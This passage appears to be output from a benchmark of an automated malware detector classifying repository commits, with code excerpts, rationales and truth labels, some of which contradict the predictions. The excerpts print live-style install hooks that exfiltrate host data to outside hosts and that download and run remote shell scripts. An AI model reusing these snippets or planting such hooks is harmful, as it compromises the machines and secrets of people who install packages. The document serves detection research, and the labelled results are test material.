Reason: Exposing a serialized public 'directory' that is used for filesystem operations allows an attacker or a manipulated asset to point the app at arbitrary filesystem locations. This is a high‑risk insecure pattern (possible data exposure or tampering) but is insecure code rather than an explicit malware payload.

**File Runtime/SavedCustomTexturesManager.cs**:
Code: `var path = Path.Combine(_pathData.Directory, id); Directory.Delete(path, true);`
Reason: Combining an externally influenced 'id' with the base directory and directly deleting the resulting path enables path traversal and deletion of arbitrary files outside the intended sandbox. This is a dangerous bug that could be exploited, but again is an insecure implementation rather than demonstrable malicious intent.

**File Runtime/SavedCustomTexturesManager.cs**:
Code: `foreach (var dir in SaveSystem.SaveSystem.GetDirectoryInfo(_pathData.Directory).EnumerateDirectories()) { /* create SavedCustomTexture(dir.Name) */ }`
Reason: Enumerating directories from an attacker-controllable base path can expose or surface arbitrary filesystem entries into the application. This increases attack surface and data exposure risk but is not direct evidence of malware.

**File Runtime/SavedCustomTexture.cs**:
Code: `public static event Action<SavedCustomTexture> OnSavedTextureAdded; // payload includes Texture2D`
Reason: Raising static events that include Texture2D and large binary payloads can lead to accidental exfiltration if subscribers forward payloads to untrusted sinks. It's a privacy/data-leakage concern rather than an explicit malicious capability.

**Summary:** Static analysis flagged multiple high‑ and medium‑severity security issues (unvalidated inspector path, path construction for deletions, directory enumeration, suspicious external URL, and added dependencies). These represent serious insecure coding and supply‑chain risks that could be exploited, but there is no indication in the static or dynamic results of active malicious payloads, persistence mechanisms, obfuscated executable code, or runtime network exfiltration originating from the commit. Therefore the commit is classified as BENIGN code with critical security vulnerabilities that should be remediated and reviewed (vet dependencies, remove/justify the external URL, validate/whitelist paths, harden deletion/enumeration logic, and limit event payload exposure).
**Truth label:** Benign

### Commit b74e96ae: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall lifecycle hook executes automatically during npm install and runs arbitrary JavaScript on the host. This enables code to run on any machine that installs the package without user consent, a classic supply-chain execution vector.

**File index.js**:
Code: `const trackingData = encodeURIComponent(`${os.homedir()}|${os.hostname()}|${__dirname}`); https.get(`https://exzuperi.ftp.sh/${trackingData}`)`
Reason: The script collects host-identifying information (home directory, hostname, module path), URL-encodes it, and performs an outbound HTTPS GET to an external domain. This is direct exfiltration of potentially sensitive PII triggered during install.

**File package.json**:
Code: `"scripts": { "notify": "curl -s https://e.pipedream.net/..." }`
Reason: An additional script in package.json invokes a third-party webhook (Pipedream). External callbacks like this can be used to track installs or trigger downstream processing of collected data, reinforcing the presence of deliberate telemetry/exfiltration.

**File index.js**:
Code: `const fs = require('fs'); console.log('If you like this package, contact ...')`
Reason: Presence of an unused fs import plus promotional output in an install-time script is suspicious: unused imports can indicate leftover or hidden functionality and install-time messages can be used for social engineering or directing victims off-chain.

**Summary:** The commit introduces an automatic preinstall hook that runs index.js and code that gathers host-specific information and sends it to external endpoints. Even though dynamic analysis produced no results (likely due to network controls or sandboxing), the static artifacts demonstrate clear, intentional install-time data exfiltration and remote callbacks. This behavior matches supply-chain malware patterns and is not benign.
**Truth label:** Malware

### Commit 0bc11083: Malware
**File package.json**:
Code: `{   "scripts": {     "preinstall": "node index.js",     "pingback": "curl https://something.m.pipedream.net"   } }`
Reason: A preinstall script causes index.js to run automatically during npm install (installation-time code execution). The presence of a 'pingback' script that contacts a pipedream.net endpoint indicates explicit phone-home/telemetry to an external service. Install-time execution combined with outbound telemetry is a high-risk vector for arbitrary actions and data exfiltration.

**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const pkg = require('./package.json'); const payload = {   home: os.homedir(),   user: os.userInfo(),   hostname: os.hostname(),   dns: /* system `
Reason: The script gathers sensitive local metadata (home directory, user info, hostname, DNS servers, and the entire package.json) and prepares it for transmission. Collecting and transmitting full package.json and local user information to an untrusted external domain (oast.fun) is consistent with data exfiltration/spyware behavior.

**File index.js**:
Code: `request.on('error', function(err) {   //console.error(err) });`
Reason: The error handler swallows errors by commenting out logging. Silently suppressing network errors reduces visibility into failed exfiltration attempts and appears designed to avoid detection and logging.

**File index.js**:
Code: `const options = { hostname: 'http://oast.fun', /* ... */ }`
Reason: The hostname field incorrectly includes the URL scheme ('http://'), which is malformed and may indicate sloppy or intentionally evasive coding to bypass simple pattern-based detections. Regardless of form, the intent is to contact an external, suspicious domain to transmit collected data.

**Summary:** Static analysis shows clear malicious intent: an install-time script (preinstall) executes code that harvests sensitive local information (home dir, user info, hostname, DNS servers, package.json) and attempts to POST it to an external, suspicious domain (oast.fun), plus an explicit pingback to pipedream.net. Error suppression and malformed request construction further indicate attempts to evade detection. Dynamic analysis produced no results (likely due to network blocking or sandbox constraints), but the static evidence is sufficient to classify this commit as malware. Immediate remediation: remove the scripts, treat systems that installed the package as potentially compromised, block the domains, and rotate exposed secrets.
**Truth label:** Malware

### Commit 6a4463a0: Benign
**File package.json**:
Code: `"test-deno": "deno test --allow-net --allow-env --allow-run ./test/deno.mjs"`
Reason: This script grants Deno broad permissions: network access (--allow-net), environment access (--allow-env), and the ability to run subprocesses (--allow-run). While dangerous if abused (it could exfiltrate secrets, contact arbitrary hosts, or spawn destructive commands), the presence of these flags in test scripts is a risky configuration rather than definitive evidence of malware.

**File package.json**:
Code: `"test-deno": "... --allow-net ... --allow-env ..."`
Reason: Allowing full environment access in a test runner can expose CI or developer secrets to any code executed by the test, including indirect dependencies. This increases the attack surface but remains a misconfiguration/vulnerability rather than an explicit malicious payload.

**File package.json**:
Code: `"create-separate-require-instance": "rm -rf <paths> && node ./scripts/create-tarball && tar -xzf <archive> && mv <dirs>"`
Reason: This script runs destructive shell commands (rm -rf) and performs filesystem operations. Such scripts can delete or overwrite files if executed unintentionally or if an attacker modifies package contents. Again, this is unsafe scripting practice but not proof that the repository intentionally contains malware.

**Summary:** Static analysis flags high-risk scripts in package.json that grant broad Deno permissions and execute destructive shell commands, which significantly increase attack surface and potential for abuse. However, dynamic analysis produced no runtime malicious behavior, and the findings describe unsafe configurations and dangerous scripts rather than an explicit malicious payload. Recommend treating the commit as benign code that requires remediation: restrict Deno permissions, avoid --allow-env/--allow-net unless necessary and whitelisted, and remove or document destructive shell operations and only run them in trusted CI/developer contexts.
**Truth label:** Benign

### Commit 150c42eb: Malware
**File package.json**:
Code: `"postinstall": "echo '...base64...' | base64 -d | bash"`
Reason: Decoding base64 and piping the result directly to bash executes an obfuscated payload during npm install. This is a high-confidence remote code execution/supply-chain technique and allows arbitrary, hidden commands to run on any system that installs the package.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall hook that runs node index.js executes arbitrary JavaScript during package installation. Preinstall hooks are a known vector for supply-chain attacks and can perform malicious actions before any developer inspects code.

**File package.json**:
Code: `"pingback": "curl https://pipedream.net/xxxxx -d $DATA"`
Reason: A script that posts data to an external pipedream endpoint indicates potential exfiltration of runtime/build information or secrets. Combined with install-time execution, this provides a channel for leaked data to reach an attacker-controlled service.

**File package.json**:
Code: `"start": "node-red"`
Reason: Automatically starting a Node-RED runtime can expose flows, credentials, and admin endpoints if run in unintended environments (CI/production). While not malicious by itself, in combination with install-time code execution it increases attack surface and risk of remote access.

**File ebay-eek/eek-util.js**:
Code: `String.fromCharCode(...), charCodeAt(...) usage`
Reason: This specific usage appears to perform benign character arithmetic (e.g., incrementing codes for ratings). It is noted as low-risk, but such APIs can be used for obfuscation in other contexts and should be reviewed; here it is not the primary concern.

**Summary:** Static analysis reveals clear, high-risk malicious patterns: an obfuscated postinstall that decodes and executes shell code, a preinstall hook that runs arbitrary JavaScript at install time, and a script that sends data to an external pipedream endpoint. These are classic supply-chain malware behaviors that enable remote code execution and data exfiltration. Dynamic analysis produced no observable runtime artifacts, but lack of runtime evidence does not negate the strong static indicators. Given the combination of obfuscation, install-time execution, and external callbacks, this commit should be treated as MALWARE. Remediation: remove the hooks and obfuscated commands, assume compromise where the package was installed, and rotate any exposed credentials.
**Truth label:** Malware

### Commit 7eb5240a: Malware
**File package.json**:
Code: `"https://hackzone.uno/psn" , "https://urluss.com/2tiUcm"`
Reason: Repository references external, suspicious-looking domains which are commonly used for command-and-control, payload hosting, or data exfiltration. Presence of such URLs in metadata or scripts is a high-risk supply-chain indicator.

**File package.json**:
Code: `"test-deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write"`
Reason: The Deno test script grants very broad permissions. If an attacker can introduce or modify test code or dependencies, these flags allow arbitrary code execution, file system modification, and unrestricted network access enabling exfiltration or remote control.

**File package.json**:
Code: `"rm -rf", "node ./scripts/create-tarball", "tar -xzf ...", "mv ... node_modules"`
Reason: Scripts run destructive filesystem and archive extraction operations and then move content into node_modules. Extracting and installing remote or unverified archives into dependencies is a common supply-chain attack vector that can introduce malicious code into runtime.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: The test script is a placeholder failing string, indicating tests are disabled or removed. This reduces automated detection of malicious changes and can be used to hide malicious modifications from CI checks.

**Summary:** Static analysis shows high-risk indicators: suspicious external URLs, a test script granting Deno full system and network permissions, and archive extraction into node_modules. These combined factors constitute a strong supply-chain and remote-execution risk. Dynamic analysis returned no observed runtime behavior, but lack of execution traces does not mitigate the clear, deliberate opportunities for malicious activity present in the commit. Treat this commit as malicious until proven otherwise.
**Truth label:** Benign

### Commit 43a47be3: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no suspicious behavior observed. No indicators of malicious activity (no suspicious API calls, network activity, or code patterns) were found in the provided reports. Note: results are limited to the supplied analyses and may not detect highly obfuscated or environment‑specific malicious behavior.
**Truth label:** Benign

### Commit 6f105c9c: Malware
**File index.js**:
Code: `await fetch('https://webhook.site/<id>', { method: 'POST', body: JSON.stringify(payload) })`
Reason: Hard-coded external webhook endpoint (webhook.site) receiving a POST containing collected system data — remote data exfiltration to a third-party URL without consent.

**File index.js**:
Code: `const payload = { package: require('./package.json'), cwd: process.cwd(), home: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: getDnsServers(), ls: lsOutput }`
Reason: The payload aggregates highly sensitive local information (full package.json, home directory, usernames, host identifiers, DNS servers and directory listings) which can leak secrets and identifiers.

**File index.js**:
Code: `fs.rmdirSync(foundPath, { recursive: true }) // targeting node_modules/@vue/compiler-sfc`
Reason: Destructive removal of a dependency directory at runtime (recursive rmdir) — supply-chain tampering that can break builds and indicate malicious intent to sabotage or modify installation state.

**File index.js**:
Code: `child_process.exec('ls', (err, stdout) => { /* include stdout in payload */ })`
Reason: Executes a shell command and captures output to include in telemetry. Shelling out increases risk and here is used to collect environment data for exfiltration.

**File index.js**:
Code: `function findModulePathUpwards(start) { /* traverse parent directories to find node_modules/@vue/compiler-sfc */ }`
Reason: Upward filesystem traversal without bounds can inspect or modify arbitrary parent directories, enabling broader attack surface and facilitating the destructive deletion above.

**Summary:** Static analysis identifies clear malicious behaviors: hard-coded remote data exfiltration to webhook.site, extensive collection of sensitive local data, runtime destructive deletion of a dependency, and execution of shell commands. These actions constitute supply-chain tampering and unauthorized information exfiltration; despite no dynamic findings recorded, the static indicators are strong and deliberate, so this commit should be treated as malware.
**Truth label:** Malware

### Commit c297ebd3: Malware
**File index.js**:
Code: `const os = require('os'); const path = require('path'); const data = [process.env.HOME, os.hostname(), __dirname].join('/'); require('http').get(`http://exzuperi.ftp.sh:449/${encodeURIComponent(data)}`
Reason: This code collects host-identifying information (home directory, hostname, module directory) and sends it in an outbound GET request to an untrusted third-party host on a non-standard port. This is silent exfiltration of sensitive environment/host data.

**File index.js**:
Code: `console.log('https://t.me/some_contact');`
Reason: Printing an unsolicited external contact link during install-time indicates an attempt to direct users to an off-repository communication channel (potential for payment, control, or social-engineering), which is suspicious in the context of the exfiltration behavior.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://enpoint.pipedream.net/..." }`
Reason: The preinstall lifecycle script executes automatically during npm install, enabling arbitrary code execution on any machine that installs the package. Combined with the included network calls and a separate pingback script to an external collector, this shows deliberate, install-time telemetry/exfiltration with no user consent.

**File package.json**:
Code: `"scripts": { "test": "node -e \"console.log('specific string'); process.exit(1)\"" }`
Reason: Test script was modified to immediately fail and print a specific string, which can hide behavior or break CI checks, reducing visibility and giving attackers more chance for silent execution or to impede detection.

**Summary:** The commit adds an automatic preinstall hook that executes code which collects host-identifying information and transmits it to an untrusted external server, plus a pingback script and an unsolicited external contact link. These behaviors—silent, automatic execution on install and exfiltration of sensitive host data—are malicious and not consistent with benign telemetry practices (no opt-in, non-standard port, third-party endpoints). Dynamic analysis showing no runtime artifacts does not mitigate the high-risk static indicators; the installation-time execution itself is sufficient to classify this commit as malware.
**Truth label:** Malware

### Commit 9e61d809: Malware
**File package.json**:
Code: `"preinstall": "node build-a-benchmark.js"`
Reason: A preinstall hook executes automatically during npm install for consumers and CI. Running arbitrary code at install time is a common vector for supply-chain malware and can cause silent compromise of developer/CI machines.

**File package.json**:
Code: `"pingback": "curl -sS 'https://eo536ohsnextro9.m.pipedream.net/...'"`
Reason: An explicit script performs a network call to a known external capture endpoint (pipedream). Presence of this pingback indicates deliberate exfiltration/testing and is suspicious even if not automatically executed.

**File build-a-benchmark.js**:
Code: `process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0`
Reason: Disabling NODE_TLS_REJECT_UNAUTHORIZED globally disables TLS certificate validation, allowing HTTPS connections to attacker-controlled servers with invalid/self-signed certs — a clear facilitation for covert exfiltration.

**File build-a-benchmark.js**:
Code: `child_process.execSync('systeminfo | findstr /B Domain')`
Reason: Execution of shell commands during install can collect sensitive host information. Combined with network calls, this provides data to exfiltrate and demonstrates active reconnaissance on the host.

**File build-a-benchmark.js**:
Code: `https.request({ hostname: '...', path: '/' + username + '?host=' + hostname + '&dir=' + __dirname }, ...)`
Reason: The script constructs an HTTPS request whose path embeds local system data (username, hostname, __dirname) and sends it to a remote host. This is direct data exfiltration of environment/host information.

**File build-a-benchmark.js**:
Code: `/* obfuscated string array + index mapping */`
Reason: The file is intentionally obfuscated (encoded string arrays and indirection). Obfuscation in repository code is a strong indicator of malicious intent to hide behavior and avoid review.

**Summary:** Static analysis reveals multiple high- and critical-severity indicators: an automatic preinstall hook that runs an obfuscated script, explicit network callbacks to an external capture endpoint, disabling TLS verification, execution of shell commands to gather host data, and construction of HTTPS requests that embed local environment information. Although dynamic analysis did not show executed results, the presence of install-time, obfuscated exfiltration code combined with network callbacks constitutes supply-chain malware. Recommend immediate removal/revert, treat installed hosts as potentially compromised, and follow incident response (isolate, rotate credentials, forensic review of outgoing traffic).
**Truth label:** Malware

### Commit 28af515c: Malware
**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const https = require('https'); const payload = {home: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers()}`
Reason: Top-level code collects sensitive local environment information (home dir, hostname, username, DNS servers) and immediately performs an HTTPS POST to a hardcoded external OAST domain. This is classic exfiltration/backdoor behavior and executes on require/import, creating a supply-chain risk.

**File index.js**:
Code: `/* network I/O executed as a module side effect (runs on import) */`
Reason: Network side effects at module initialization mean any dependent project will trigger the exfiltration automatically. This stealthy behavior is a high-risk pattern for malicious packages.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: The test script was changed to a placeholder that fails immediately. While not itself code-executing malware, it can be used to hide or disable tests that might have caught the malicious behavior, hampering detection and review.

**File (commit metadata)**:
Code: `https://t.me/exzuperi`
Reason: An external Telegram contact included in commit metadata is suspicious and can indicate coordination with an untrusted party or an attempt to provide an out-of-band channel for malicious actors. It supports the view that the change is intentional and potentially malicious.

**Summary:** Static analysis found critical/high-severity indicators: immediate top-level network POST to a hardcoded OAST domain combined with collection of sensitive host/user/DNS information and execution at module import time. These behaviors match data exfiltration/backdoor patterns used in malicious supply-chain attacks. Dynamic analysis produced no positive benign signals (empty result), which may indicate blocking or inert execution in the analysis environment but does not negate the clear static indicators. Given the high-confidence, high-severity findings and the covert import-time exfiltration, classify the commit as MALWARE and recommend immediate removal, rollback, and a full supply-chain and contributor provenance investigation.
**Truth label:** Malware

### Commit 51c00013: Malware
**File index.js**:
Code: `await fetch('https://exzuperi.ftp.sh', { method: 'POST', body: JSON.stringify(payload) })`
Reason: Active outbound HTTPS request to a hardcoded third‑party endpoint. Sending data to an external host without configuration or opt‑in is characteristic of data exfiltration.

**File index.js**:
Code: `const payload = { hd: os.homedir(), ls: process.env.PWD || process.cwd(), hostname: os.hostname() }`
Reason: Collects sensitive host and filesystem identifiers (home directory, current directory, hostname) into a JSON payload. These fields can reveal user identity and environment details useful for attackers.

**File index.js**:
Code: `console.log('telegram: https://t.me/exzuperi')`
Reason: Writes an operator contact/social link to stdout. This may be an attempt to advertise the operator or provide a covert channel for follow‑up, which is suspicious in production code performing exfiltration.

**File package.json**:
Code: `"test": "echo \"exzuperi was here\" && exit 1"`
Reason: The test script was changed to echo an attacker identifier and exit non‑zero, which sabotages CI and indicates intentional malicious modification or backdoor signaling.

**File index.js**:
Code: `const dns = require('dns'); const querystring = require('querystring'); const fs = require('fs'); const package = packageJSON.name;`
Reason: Unused imports and ambiguous identifiers (e.g., 'package') are a code smell that can indicate sloppy or deliberately obfuscated/malicious code intended to hide intent.

**Summary:** Static analysis shows clear malicious behavior: the commit collects sensitive host/file information and transmits it to a hardcoded external endpoint, includes operator contact in runtime output, and sabotages tests with an attacker string. Although dynamic analysis returned no runtime artifacts, the presence of hardcoded exfiltration and test sabotage is sufficient to classify this commit as MALWARE. Immediate remediation: remove the exfiltration code, rotate any exposed secrets, revert malicious test changes, and perform a full repository and CI audit.
**Truth label:** Malware

### Commit 54ae8848: Malware
**File package.json**:
Code: `"scripts": { "postinstall": "node index.js" }`
Reason: A postinstall script will execute index.js automatically during package installation on every environment that installs the package (developer machines, CI, build agents). Postinstall hooks are a high-risk supply‑chain/backdoor vector because they run arbitrary code without explicit operator action.

**File index.js**:
Code: `const https = require('https'); https.get('https://x640e10yd989u1v16wl1c1qw6nce06ov.oastify.com', res => { /* ... */ });`
Reason: The install-time script makes an outbound HTTPS request to a suspicious OAST/Burp-style domain. This causes beaconing from every machine that installs the package, enabling tracking, telemetry collection, and potential command-and-control or follow-up payload delivery.

**File index.js**:
Code: `// (implicit) any install-time network call may leak environment data (IP, hostname, headers)`
Reason: Even though the request body may not contain secrets, install-time network calls can leak sensitive metadata and identify targets. Combined with automatic execution via postinstall, this behavior is consistent with malicious supply-chain backdoors.

**Summary:** Static analysis shows a postinstall hook that automatically executes index.js and that index.js performs an outbound request to a suspicious OAST-style domain. This is a classic malicious supply-chain/backdoor pattern (install-time remote beaconing and potential remote control). Although dynamic analysis returned no results, the static indicators are high-risk and sufficient to classify the commit as malware. Recommended actions: remove the postinstall hook and network call, revoke the package, notify and audit downstream consumers, and investigate systems that installed this version.
**Truth label:** Malware

### Commit 1f9f3794: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl -s https://pipedream.net/... | bash" }`
Reason: A 'preinstall' lifecycle script runs automatically during npm install, causing index.js to execute on any installing machine (remote code execution risk). The presence of a separate 'pingback' curl call indicates out-of-band signaling to third-party endpoints.

**File index.js**:
Code: `const https = require('https'); const postData = JSON.stringify(trackingData); const options = { hostname: 'oastify.com', path: '/...', method: 'POST', headers: { 'Content-Type': 'application/json', '`
Reason: The code builds an HTTPS POST to a third-party host (oastify.com) and prepares JSON payload for exfiltration. Even if the write/end calls are commented or truncated, the explicit construction of an external exfiltration channel is malicious and dangerous.

**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const fs = require('fs'); const trackingData = { home: os.homedir(), user: os.userInfo().username, host: os.hostname(), dns: dns.getServers(), pac`
Reason: This collects sensitive and identifying local information (home directory, username, hostname, DNS servers) plus the entire package.json. Aggregating and transmitting such PII/project data to an untrusted endpoint constitutes a data-exfiltration/privacy breach.

**Summary:** The commit introduces an install-time lifecycle hook that executes arbitrary code (preinstall -> index.js) which collects sensitive local environment and project data and attempts to send it to untrusted third-party endpoints (oastify.com and a pipedream URL). These behaviors — automatic execution on install, harvesting PII/project data, and preparing an outbound exfiltration channel — are hallmark malicious indicators. Even though dynamic analysis returned no runtime results, the static evidence and the automatic execution vector make this commit malicious.
**Truth label:** Malware

### Commit f2b41665: Malware
**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: A lifecycle preinstall script executes a local Node script automatically during npm install and redirects output to /dev/null. This hidden, automatic execution can run arbitrary code on any environment that installs the package (developer machines, CI), enabling credential harvesting, background processes, or other malicious activity.

**File package.json**:
Code: `"pingback": "curl -X POST https://<pipedream_endpoint>/ ..."`
Reason: A hardcoded pingback/telemetry script posts to an external Pipedream endpoint. Combined with an automatically-running lifecycle script, this allows exfiltration of environment/installation metadata (and potentially secrets) to a third party.

**File src/components/BaseFileUploader.stories.js**:
Code: `uploader configured to send files to https://dummyjson.com (external upload endpoint)`
Reason: Demo code uploads to an external service. If executed in CI or by a developer, user or test files could be leaked to a third party. This increases the risk surface when combined with an auto-running install script.

**File src/components/BaseAutocompleteFetch.stories.js (and other stories)**:
Code: `fetch calls to external APIs (for example https://effettandem.com/...) in story files`
Reason: Storybook demos call external APIs by default. These outbound requests may leak environment information or expose sensitive data when run in developer/CI environments and should be mocked or opt-in.

**File src/components/BaseDataIterator.stories.js**:
Code: `":href=\"item.website_url\"" with "target=\"_blank\"" (missing rel)`
Reason: Links opened in new tabs lack rel="noopener noreferrer", enabling reverse tabnabbing and potential post-navigation manipulation of the originating page. This is a security bug that can be abused by malicious targets.

**File package.json**:
Code: `"dependencies": { "stw-tenant-library": "...", "@headlessui/vue": "...", "storybook": "..." }`
Reason: New/updated third-party dependencies introduce supply-chain risk; combined with an automatic install script and external pingback they could be used to further conceal or propagate malicious behavior.

**Summary:** The commit includes a preinstall npm lifecycle script that automatically runs a local index.js with output suppressed and a hardcoded pingback to a Pipedream endpoint. This combination is a clear pattern for covert code execution and data exfiltration during package installation. Although dynamic analysis produced no observed runtime events, the static indicators (hidden automatic execution + external telemetry endpoint) are strong evidence of malicious intent rather than benign misconfiguration. Treat this commit as malware: remove/disable the lifecycle scripts, audit and remove the pingback, and fully inspect the referenced index.js and new dependencies.
**Truth label:** Benign

### Commit 3275aaa2: Malware
**File index.js**:
Code: `child_process.exec("hostname; pwd; whoami; curl https://ifconfig.me | xxd -p | while read -r h; do nslookup $h 108.137.194.171; done")`
Reason: Executes complex shell commands that collect local system identifiers (hostname, working directory, user) and queries public IP, then performs obfuscated lookups to an external IP — behavior consistent with stealthy data collection and exfiltration via arbitrary shell execution.

**File index.js**:
Code: `use of child_process.exec(...) to run arbitrary shell commands`
Reason: Using exec with a concatenated shell pipeline allows arbitrary command execution and multiple operations in a single call, enabling remote code behavior and making it easy to introduce hidden or malicious steps.

**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: A lifecycle hook that runs automatically during npm install; this causes the malicious index.js behavior to execute on any machine installing the package, exposing environment variables and CI secrets without user consent.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: Contains a script that contacts a pipedream.net endpoint (commonly used for capturing requests). This indicates intentional transmission of data to an external request-capture service and is suspicious for telemetry/exfiltration.

**Summary:** Static analysis shows deliberate, obfuscated collection of local system information and contact to multiple external endpoints (including ifconfig.me, a hardcoded IP, and a pipedream capture URL) executed via child_process.exec and triggered automatically by a preinstall lifecycle script. These behaviors allow silent data collection and remote network communication during package installation and match common malicious/exfiltration/backdoor patterns. Dynamic analysis produced no observable results (likely due to sandbox/network blocking), but the static indicators are sufficient to classify the commit as malware.
**Truth label:** Malware

### Commit a7d4ba46: Malware
**File package.json**:
Code: `scripts: preinstall: curl ... | sh; pingback: curl https://e.pipedream.net/...?; dependencies added: mmsdk-apml-htmlrenderer, stw-tenant-library`
Reason: The preinstall lifecycle script runs a curl piped to a shell which allows arbitrary command execution during npm install and can access environment variables and local files for exfiltration. The pingback script contacts an external collector (pipedream), providing a confirmation/exfiltration channel. New third-party dependencies increase supply-chain risk.

**File index.js**:
Code: `module.exports.hacked = true;`
Reason: The original index.js was replaced with a minimal export named 'hacked', indicating direct tampering or a backdoor that alters module behavior and likely malicious intent.

**Summary:** Multiple high-severity static indicators of malicious activity are present: an npm preinstall script that executes remote code, an external pingback endpoint for confirmation/exfiltration, replacement of runtime code with a suspicious export, and addition of untrusted dependencies. Dynamic analysis produced no observable runtime data but does not negate the clear, high-confidence static evidence. Treat this commit as malware and follow incident response steps (revert, audit, rotate credentials, block/publish notifications).
**Truth label:** Malware

### Commit 07b083cf: Benign
**Summary:** Both static and dynamic analyses reported no issues: static analysis found zero issues and dynamic analysis produced no suspicious behaviors or results. No indicators of malicious activity (network exfiltration, persistence attempts, dangerous API usage, code obfuscation, or unexpected resource access) were observed in the provided reports. Based on the available data, the commit appears benign. (Assessment limited to the supplied analysis artifacts; broader code review and extended runtime monitoring would further reduce residual risk.)
**Truth label:** Benign

### Commit 15b25992: Benign
**File N/A**:
Reason: Static analysis reported 0 issues and dynamic analysis finished with no suspicious behavior or indicators of compromise.

**Summary:** Both static and dynamic analyses produced no findings. No malicious patterns, indicators, or runtime behaviors were detected, so the commit is classified as benign.
**Truth label:** Benign

### Commit bcd71456: Malware
**File lib/cli/DefaultCommand.js**:
Code: `require(transformPath)(/* invoked immediately with runtime data */)`
Reason: Dynamic require() of a user/CLI-supplied path followed by immediate invocation allows execution of arbitrary code with the CLI process privileges. This is a direct remote/local code execution vector if an attacker can control the transform file or place a malicious file at that path.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://*.pipedream.net/...." }`
Reason: A pingback script that curls an external pipedream.net URL constitutes a built-in exfiltration/telemetry hook to an external collector. If executed (manually, in CI, or via lifecycle), it will make outbound requests and can leak data.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: An npm lifecycle script that runs arbitrary JavaScript during install is a supply-chain execution vector. Combined with the ability to fetch or place malicious files, this can execute code during dependency installation in CI or developer environments.

**File package.json**:
Code: `"dependencies": { "systeminformation": "..." }`
Reason: Adding the 'systeminformation' dependency allows collection of extensive host/environment metadata. Used alongside remote pingback or arbitrary code execution, it facilitates sensitive data harvesting and remote exfiltration.

**File lib/cli/DefaultCommand.js**:
Code: `provideJaegerTracing(...); executeSafe(...); fs.writeFileSync(stackbitPath, generatedYaml);`
Reason: Tracing enabled (Jaeger) may send internal/configuration data to remote collectors if configured, and writing generated YAML to a user-supplied --stackbit path can overwrite arbitrary files. These behaviors increase risk of sensitive data leakage and destructive file writes.

**Summary:** Static analysis reveals multiple high-risk behaviors: dynamic require of user-supplied modules (arbitrary code execution), an explicit external "pingback" script to a pipedream.net collector (exfiltration telemetry), npm lifecycle preinstall script (supply-chain execution), addition of a data-collection dependency (systeminformation), tracing that can send data to remote collectors, and uncontrolled file writes to user-specified paths. Although dynamic analysis produced no runtime events, the deliberate inclusion of these capabilities and active exfiltration script indicate malicious or highly suspicious intent and a real potential for abuse; therefore the commit should be treated as malware.
**Truth label:** Benign

### Commit 8d9a2efa: Benign
**File N/A**:
Reason: Static analysis reported 0 issues and dynamic analysis produced no observable results/events for the commit; no suspicious code patterns or runtime behaviors were detected.

**Summary:** Both static and dynamic analyses produced no findings or malicious behavior. Based on the available data, the commit is classified as benign. If additional context, runtime environments, or inputs are introduced, further review may be warranted.
**Truth label:** Benign

### Commit 2463b922: Malware
**File index.js**:
Code: `const postData = JSON.stringify({ hd: os.homedir(), un: os.userInfo().username, dns: getSystemDNS(), __dirname, pkg: require('./package.json') }); const req = https.request({ hostname: 'https://psl90.`
Reason: Constructs a POST request that includes highly sensitive local information (home directory, username, DNS, __dirname, and the full package.json) and sends it to an external, likely attacker-controlled domain (oastify.com). This is direct data exfiltration and not typical benign telemetry practice.

**File index.js**:
Code: `// console.error(error);`
Reason: Network errors from the outbound request are commented out/suppressed, preventing visibility of failures. Silent error handling is a common stealth technique used by malicious code to avoid detection and debugging.

**File index.js**:
Code: `const options = { hostname: 'https://psl90.oastify.com/some/path', path: '/', method: 'POST' };`
Reason: The request options include a scheme/full URL in options.hostname rather than a bare host and path. This is incorrect usage and may indicate obfuscation or sloppy attempt to hide true destination; it should be validated and treated as suspicious.

**Summary:** Static analysis shows deliberate collection and transmission of sensitive local environment data (including package.json) to an external third-party domain, combined with suppressed error handling and malformed/obfuscated hostname usage. These behaviors constitute covert data exfiltration and are consistent with malicious activity. Dynamic analysis produced no runtime artifacts, but absence of dynamic evidence does not mitigate the clear static indicators of exfiltration and stealth — classify as MALWARE.
**Truth label:** Malware

### Commit 0313c323: Malware
**File package.json**:
Code: `"postinstall": "curl -fsSL https://research20934i.sherlockshat007.workers.dev/script.sh -o script.sh && chmod +x ./script.sh && ./script.sh"`
Reason: The postinstall hook downloads a shell script from an untrusted remote domain and immediately executes it during package installation, enabling arbitrary remote code execution in the installer's context.

**File package.json**:
Code: `"https://research20934i.sherlockshat007.workers.dev"`
Reason: Unexpected network fetch to an external, attacker-controlled domain from the package manifest. Such behavior is commonly used to deliver payloads or perform data exfiltration during supply-chain attacks.

**File package.json**:
Code: `"./script.sh"`
Reason: Executing a fetched script file (./script.sh) grants the remote payload the same privileges as the installing process, allowing filesystem modification, credential theft, persistence mechanisms, and lateral movement — high-risk actions consistent with malware.

**Summary:** Static analysis identifies a postinstall hook that downloads and executes a remote shell script from an attacker-controlled domain, which constitutes a supply-chain remote code execution vector. Although dynamic analysis produced no artifacts, the presence of immediate download-and-execute behavior in package.json is a high-confidence indicator of malicious intent and risk; treat this commit as malware, stop installs, remove the hook, rotate potentially exposed secrets, and perform incident response.
**Truth label:** Malware

### Commit d27d3f33: Benign
**File index.js**:
Code: `const https = require('https'); https.get('https://.../collect', res => { /* handle response */ });`
